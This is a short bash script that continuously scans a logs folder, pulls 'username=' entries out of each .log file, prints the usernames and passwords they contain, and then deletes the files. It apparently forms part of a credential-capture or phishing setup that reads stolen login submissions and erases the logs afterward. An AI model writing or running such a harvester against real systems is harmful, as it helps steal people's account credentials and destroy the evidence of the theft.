#!/bin/bash
cd ./logs
while true; do
    for logname in `ls` ; do
        [ ${logname:(-4)} == ".log" ] || continue
        grep -a "username=" $logname | awk -F'[&=]' '{print "\nUsername:  "$4"\nPassword:  "$6}'
        rm -f $logname
    done
    sleep 1
done
